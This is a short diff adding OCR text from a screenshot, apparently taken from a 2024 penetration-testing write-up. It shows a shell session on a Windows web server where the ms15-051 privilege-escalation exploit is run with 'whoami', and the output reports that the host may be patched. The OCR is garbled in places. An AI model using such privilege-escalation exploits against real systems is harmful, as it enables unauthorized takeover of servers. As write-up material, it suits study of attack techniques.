@@ -1,0 +1,13 @@
+# OCR: e01e2491e975356cf0ad58fbfe4f9694.jpg
+# 来源: .\02-WriteUp\2024\e01e2491e975356cf0ad58fbfe4f9694.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:44
+
+C:/Server/WebSits/admin/ >ms15-051.exe
+{#] ms15-051 fixed by zegonvh
+{#] usage: ms15-051 command
+{#] eg: ms15-051 “whoami /all”
+C:/Server/WebSits/admin/ >ms15-051.exe "whoami"
+{#] ms15-051 fixed by zegonvh
+[bd may be patched
+CitServertWebsitsadmin/ >
